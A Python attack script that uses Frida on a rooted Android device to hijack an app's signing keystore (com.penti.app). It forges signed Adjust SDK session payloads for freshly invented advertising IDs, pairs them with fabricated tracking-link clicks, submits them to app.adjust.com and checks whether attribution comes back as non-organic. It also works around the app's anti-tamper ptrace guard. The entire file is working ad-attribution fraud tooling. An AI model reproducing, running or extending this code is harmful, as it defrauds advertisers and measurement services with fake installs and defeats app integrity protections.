# mint_session_chain.py — THE decisive test for "is the SIGNER the gate?".
#   1. fresh GAID + OUR marker click (real engagement)
#   2. device piggy-mint of a SESSION map for THAT GAID (real keystore H)
#      via the new agent RPC `setmint` (kind/activity override)
#   3. send /session with the minted blob, transported by the device (curl)
#   4. poll /attribution -> non-organic would close the whole chain
import base64
import datetime as dt
import json
import os
import subprocess
import sys
import threading
import time
import uuid

HERE = r"C:\Users\Apps\Downloads\com.penti.app\adj9\rev"
sys.path.insert(0, HERE)
sys.stdout.reconfigure(line_buffering=True)
import frida
import adj9_full_chain as F
import run_funnel as R

AGJS = os.path.join(HERE, "agent", "adj9agent.js")
OUT = os.path.join(HERE, "mint_session_result.json")
CREATIVE = "cline_mintsess"
OFF_MIN, OFF_LABEL = 330, "+0530"

WIRE = ['android_uuid', 'api_level', 'app_token', 'app_version',
        'attribution_deeplink', 'connectivity_type', 'cpu_type', 'created_at',
        'device_manufacturer', 'device_name', 'device_type', 'display_height',
        'display_width', 'enqueue_size', 'environment', 'first_error',
        'foreground', 'gps_adid', 'gps_adid_attempt', 'gps_adid_src',
        'hardware_name', 'initiating_package_name', 'installed_at', 'language',
        'last_error', 'needs_response_details', 'offline_mode_enabled',
        'os_build', 'os_name', 'os_version', 'package_name', 'retry_count',
        'screen_density', 'screen_format', 'screen_size', 'sent_at',
        'session_count', 'store_name_from_system', 'tracking_enabled',
        'ui_mode', 'updated_at', 'wait_time', 'wait_total']


def fmt(ts, ms):
    d = (dt.datetime.fromtimestamp(ts, dt.timezone.utc)
         + dt.timedelta(minutes=OFF_MIN))
    return d.strftime("%Y-%m-%dT%H:%M:%S." + "%03d" % ms + "Z" + OFF_LABEL)


def sh(cmd):
    return subprocess.run(["adb", "shell", cmd], capture_output=True,
                          text=True, timeout=30).stdout


def su_file(path):
    """cat a file as root (the app dir is not world-readable)."""
    r = subprocess.run(["adb", "shell",
                        "/debug_ramdisk/su -c 'cat %s'" % path],
                       capture_output=True, text=True, timeout=30)
    return r.stdout.strip()


def setup_chain(dev):
    F.DEV, F.UA = R.dev_from_json(dev), R.ua_from_json(dev)
    tz = (dev.get("timezone") or "+0530").strip()
    F.OFF_MINUTES = (int(tz[1:3]) * 60 + int(tz[3:5])) * (
        -1 if tz[0] == "-" else 1)
    F.OFF_LABEL = tz
    F.USE_DEVICE = True
    F.USE_PROXY = False
    F.ADD_IDFA = False


def click(gps, dev):
    link = (R.LINK or F.DEFAULT_LINK)
    link = link.replace("{click_id}", "clk-" + uuid.uuid4().hex[:12])
    link = link.replace("{sub3}", gps)
    link = link.replace("creative=penti_generic", "creative=" + CREATIVE)
    for attempt in (1, 2):
        ref, hop = R.click_tracker(link, gps, F.UA, dev)
        print("REFERRER:", ref, flush=True)
        if ref and "adjust_reftag=" in ref:
            return ref
        print("  retry click", attempt, flush=True)
    return None
def mint(gps, auid, ins):
    """piggy-mint a SESSION map for gps/auid via the agent's setmint RPC."""
    ev = {"sigmap": None, "piggy": []}
    ready = threading.Event()

    def on_msg(m, data):
        if m.get("type") != "send":
            return
        p = m.get("payload", {})
        t = p.get("type")
        if t == "sigmap":
            ev["sigmap"] = True
            print("[sigmap] act=%d glob=%d" % (len(p.get("activity") or {}),
                                               len(p.get("globals") or {})),
                  flush=True)
        elif t == "piggy":
            ev["piggy"].append(p.get("result"))
            print("[piggy %d] ok=%s blobLen=%s" % (
                len(ev["piggy"]), p.get("result", {}).get("ok"),
                p.get("result", {}).get("blobLen")), flush=True)
        elif t == "ready":
            ready.set()

    subprocess.run(["adb", "shell", "/debug_ramdisk/su -c 'pkill -9 frs64; "
                    "pkill -9 fs17root'"], capture_output=True)
    time.sleep(1)
    subprocess.run(["adb", "shell", "/debug_ramdisk/su -c "
                    "'setsid /data/local/tmp/fs17root -l 127.0.0.1:27042 "
                    "> /data/local/tmp/fr.log 2>&1 &'"], capture_output=True)
    time.sleep(4)
    subprocess.run(["adb", "forward", "tcp:27042", "tcp:27042"],
                   capture_output=True)
    rdev = frida.get_device_manager().add_remote_device("127.0.0.1:27042")
    # The app carries an anti-tamper guard: a FAILED ptrace makes it self-kill,
    # so retrying the same pid is useless and a stale pid poisons the loop.
    # Pattern validated in ks_combo_run.py: restart, attach on FIRST sighting.
    sess = None
    for outer in range(6):
        sh("/debug_ramdisk/su -c 'am force-stop com.penti.app'")
        time.sleep(0.4)
        sh("pm clear com.penti.app")      # fresh-install burst => the app signs
        time.sleep(0.6)
        sh("am start -n com.penti.app/.ui.main.MainActivity")
        pid, t0 = 0, time.time()
        while time.time() - t0 < 8:
            pid = int(sh("pidof com.penti.app").strip() or 0)
            if pid:
                break
            time.sleep(0.05)
        if not pid:
            print("[outer %d] app never appeared" % (outer + 1), flush=True)
            continue
        try:
            sess = rdev.attach(pid)
            print("[outer %d] app attach OK (pid %d)" % (outer + 1, pid),
                  flush=True)
            break
        except Exception as e:
            print("[!] outer %d attach failed: %s" % (outer + 1, str(e)[:80]),
                  flush=True)
            sess = None
            time.sleep(1.0)
    if sess is None:
        print("[F] attach failed")
        return None
    scr = sess.create_script(open(AGJS, "r", encoding="utf-8").read())
    scr.on("message", on_msg)
    scr.load()
    for _ in range(40):
        if ready.is_set():
            break
        time.sleep(0.5)
    scr.exports_sync.setmint({
        "kind": "session",
        "activity": {"gps_adid": gps, "android_uuid": auid,
                     "installed_at": ins, "updated_at": ins,
                     "session_count": "1"},
    })
    print("[*] setmint armed (session map, gps=%s, ins=%s)" % (gps, ins),
          flush=True)
    kicked = 0
    deadline = time.time() + 200
    MINT_FP = ("/storage/emulated/0/Android/data/com.penti.app/files/"
               "mint_out1.json")
    while not ev["piggy"] and time.time() < deadline:
        time.sleep(1)
        # the message channel can die silently (slice 97 quirk); the agent
        # ALSO writes the mint to a device file — recover from there
        r = sh("/debug_ramdisk/su -c 'ls -la %s 2>/dev/null'" % MINT_FP)
        if "mint_out1.json" in r:
            raw = su_file(MINT_FP)
            if raw:
                try:
                    ev["piggy"].append(json.loads(raw))
                    print("[piggy-file] recovered mint_out1.json", flush=True)
                    break
                except Exception as e:
                    print("[!] mint file parse:", str(e)[:80], flush=True)
        if time.time() > deadline - 120 and kicked < 3:
            kicked += 1
            print("[*] kicker", kicked, flush=True)
            sh("input keyevent KEYCODE_HOME")
            time.sleep(2)
            sh("am start -n com.penti.app/.ui.main.MainActivity")
            time.sleep(25)
    out = None
    if ev["piggy"]:
        p = ev["piggy"][0]
        sig = (p.get("auth") or "")
        b64 = (sig.split('signature="')[1].split('"')[0]
               if 'signature="' in sig else p.get("blobB64"))
        blob = base64.b64decode(b64) if b64 else b""
        pairs = p.get("mapPairs") or []
        mp = {k: v for k, v in pairs if v is not None}
        print("[mint] blob=%dB gps_in_map=%s" % (len(blob),
                                                 mp.get("gps_adid")), flush=True)
        out = {"auth": sig, "blob_b64": b64, "blob_hex": blob.hex(),
               "mapPairs": pairs, "map": mp, "stamp": p.get("stamp")}
    sess.detach()
    return out
def main():
    dev = json.load(open(os.path.join(HERE, "dev_mi.json"),
                         encoding="utf-8"))
    setup_chain(dev)
    gps = str(uuid.uuid4())
    auid = str(uuid.uuid4())
    print("GAID:", gps, flush=True)
    rec = {"gps": gps, "auid": auid, "creative": CREATIVE}
    t_click = time.time()
    ref = click(gps, dev)
    if not ref:
        print("[F] no referrer")
        sys.exit(1)
    rec["referrer"] = ref
    ins = fmt(t_click + 45, 431)
    ms = mint(gps, auid, ins)
    if not ms:
        print("[F] mint failed")
        sys.exit(2)
    got = ms["map"].get("gps_adid")
    rec["mint"] = {"blob_hex": ms["blob_hex"], "auth": ms["auth"],
                   "stamp": ms["stamp"], "gps_in_map": got,
                   "keys": len(ms["map"])}
    if got != gps:
        print("[!] minted map gps=%s != clicked gps (race); re-mint" % got,
              flush=True)
        ms = mint(gps, auid, ins)
        rec["mint"] = {"blob_hex": ms["blob_hex"], "auth": ms["auth"],
                       "stamp": ms["stamp"],
                       "gps_in_map": ms["map"].get("gps_adid"),
                       "keys": len(ms["map"])}
    wait = (t_click + 47) - time.time()
    if wait > 0:
        print("waiting %.0fs to reach install time..." % wait, flush=True)
        time.sleep(wait)
    blob = bytes.fromhex(ms["blob_hex"])
    q = {k: ms["map"][k] for k in WIRE if k in ms["map"]}
    s, r = F.send_device("https://app.adjust.com/session", q, blob)
    print("SESSION (minted blob, device transport):", s, str(r)[:250],
          flush=True)
    rec["session"] = [s, str(r)[:600]]
    try:
        ask = json.loads(r).get("ask_in", 0) or 0
    except Exception:
        ask = 0
    if ask:
        w = min(ask / 1000.0, 180.0)
        print("ask_in=%d -> wait %.0fs" % (ask, w), flush=True)
        time.sleep(w)
    ptoken = "e" + uuid.uuid4().hex * 3 + ":APA91b" + uuid.uuid4().hex * 3
    ib = "backend" if ask else "sdk"
    rec["arms"] = []
    for i in (1, 2):
        s2, r2 = F.api_attribution(gps, auid, ptoken, ib)
        try:
            a = json.loads(r2).get("attribution", {})
            v = "%s / %s / eng=%s / inst=%s" % (
                a.get("tracker_token"), a.get("network"),
                a.get("engagement_time"), a.get("installed_at"))
        except Exception:
            v = "HTTP %s %s" % (s2, str(r2)[:150])
        print("ATTR%d: %s" % (i, v), flush=True)
        rec["arms"].append({"http": s2, "verdict": v, "raw": str(r2)[:1500]})
        if i == 1:
            time.sleep(25)
    json.dump(rec, open(OUT, "w"), indent=1)
    print("saved", OUT)


if __name__ == "__main__":
    main()